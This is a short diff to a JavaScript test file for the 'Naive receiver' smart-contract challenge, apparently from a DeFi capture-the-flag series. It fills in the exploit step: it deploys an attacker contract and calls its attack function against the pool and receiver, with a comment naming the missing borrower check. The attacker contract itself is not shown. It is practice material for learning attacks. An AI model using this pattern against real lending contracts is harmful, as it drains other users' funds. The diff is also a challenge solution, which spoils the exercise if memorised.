@@ -30,7 +30,12 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        // Naive receiver lender pool doesn't check if borrower is the sender
+        // so we can call it from our attacker
+        // Solution in single transaction
+        const attackerContractFactory = await ethers.getContractFactory('NaiveReceiverAttacker', attacker);
+        const attackerContract = await attackerContractFactory.deploy();
+        await attackerContract.connect(attacker).attack(this.pool.address, this.receiver.address);
     });
 
     after(async function () {
